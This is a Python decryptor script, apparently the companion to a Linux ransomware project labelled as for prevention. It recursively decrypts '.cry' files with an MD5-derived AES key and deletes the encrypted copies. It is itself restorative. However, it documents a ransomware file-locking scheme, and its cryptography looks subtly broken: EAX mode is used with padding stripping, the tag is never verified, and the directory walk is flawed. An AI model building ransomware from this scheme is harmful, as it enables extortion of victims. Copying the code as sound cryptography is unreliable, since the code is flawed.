#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ransomware for GNU/Linux systems in prevention issues
Usage::
	./decryptor.py -k theSecretAESKey -d /path/test
	./decryptor.py -k theSecretAESKey -d /path/test -e cry
"""

import os
import argparse
import string
from hashlib import md5
from Crypto.Cipher import AES

# colors
WHITE = '\033[0m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
DEBUGBLUE = '\033[94m[#]\033[0m '
WARNINGRED = '\033[91m[-]\033[0m '
WARNINGRE = '\n\033[92m[+]\033[0m '
INFOYELLOW = '\033[93m[~]\033[0m '

def error(desc="Aucune description"):
	print(f"{WARNINGRED}Erreur : {desc}")
	exit(0)

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-k', '--key',
						dest='key',
						required=True,
						help="clé AES qui a servi à chiffrer les fichiers",
						type=str)
	parser.add_argument('-d', '--directory', 
						dest='directory',
						required=True,
						help="emplacements des fichiers qui ont été chiffrés. E.g. /home,/mnt,/var/www,/media",
						type=str)
	parser.add_argument('-e', '--extension',
						dest='extension',
						required=False,
						default='cry',
						help="extension après chiffrement. Par défaut cry",
						type=str)
	args = parser.parse_args()

	print(f"{WARNINGRE}--key\t{args.key}")
	print(f"{WARNINGRE}--directory\t{args.directory}")
	print(f"{WARNINGRE}--extension\t{args.extension}")
	return args

def verify_args(args):
	# --key
	if not args.key:
		error(desc="Aucune clé spécifié")

	# --directory
	if args.directory:
		list_directory_path = args.directory.split(',')
		for path in list_directory_path:
			if not os.path.exists(path):
				error(desc="Un des répertoires spécifiés n'existe pas")
	else:
		error(desc="Aucun répertoire spécifié")

	# --extension
	if args.extension:
		alphabet = string.ascii_letters + string.digits
		for letter in args.extension:
			if letter not in alphabet:
				error(desc="Syntax de l'extension erronée")
	else:
		error(desc="Aucune extension spécifiée")

def derive_key_and_iv(password, salt, key_length, iv_length): # Derive key and IV from password and salt
    d = b''
    while len(d) < key_length + iv_length:
        d += md5(d + str(password).encode() + salt).digest()

    return d[:key_length], d[key_length:key_length+iv_length] # key(32 bytes), iv(16 bytes)

def decrypt(in_file, out_file, password, key_length):
    # retreive the salt at the begin of file
    bs = AES.block_size
    salt = in_file.read(bs)

    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_EAX, iv)
    next_chunk = ''
    finished = False

    while not finished:
        chunk = next_chunk
        next_chunk = cipher.decrypt(in_file.read(1024 * bs))

        if len(next_chunk) == 0:
            padding_length = chunk[-1]
            chunk = chunk[:-padding_length]
            finished = True

        out_file.write(bytes(x for x in chunk)) 

def decryption_process(args):
	print(f"{WARNINGRE}Déchiffrement des fichiers")

	list_directory_path = args.directory.split(',')
	files = []

	# Lister l'arborescence de fichiers
	while len(list_directory_path) > 0:
		for (dirpath, dirnames, filenames) in os.walk(list_directory_path.pop()):
			list_directory_path.extend(dirnames)
			files.extend(map(lambda n: os.path.join(*n), zip([dirpath] * len(filenames), filenames)))

	for filepath in files:
		filename = os.path.splitext(filepath)[0]
		ext = os.path.splitext(filepath)[1]
		# Chiffrer tous les fichier en '.cry'
		if ext == '.' + args.extension:
			# Déchiffrer le fichier actuel dans le nouveau
			with open(filepath, 'rb') as in_file, open(filename, 'wb') as out_file:
				print(f"{DEBUGBLUE}{filepath}", end='\n')
				print(f"{DEBUGBLUE}Decrypt...", end='\r')
				key_length=32	# AES-256 bits = 32 bytes
				decrypt(in_file, out_file, args.key, key_length)
				# Supprimer le fichier chiffré
				os.remove(filepath)

def main():
	args = parse_args()
	verify_args(args)

	enter = input('ENTER')
	decryption_process(args)

	print(f"\n{DEBUGBLUE}Les droits des fichiers n'ont pas été conservés")

if __name__ == '__main__':
	main()
	exit(0)